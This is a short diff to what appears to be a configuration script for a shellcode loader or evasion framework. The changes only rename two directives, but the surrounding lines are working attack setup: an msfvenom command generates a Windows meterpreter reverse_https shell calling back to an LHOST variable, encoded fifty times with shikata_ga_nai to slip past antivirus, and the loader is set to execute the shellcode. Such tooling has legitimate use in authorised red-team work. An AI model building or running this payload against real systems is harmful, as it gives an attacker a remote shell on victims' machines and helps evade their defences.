@@ -20,14 +20,14 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > input/sc_c.txt
 
 # set shellcode source
-set_shellcode_source static_from_file input/sc_c.txt
+set_payload_source static_from_file input/sc_c.txt
 
 # set decoder and crypto key source
 set_decoder none
 set_key_source none
 
 # set shellcode binding technique
-set_shellcode_binding exec_shellcode
+set_payload_execution_method exec_shellcode
 
 # enable debug output
 enable_debug_print
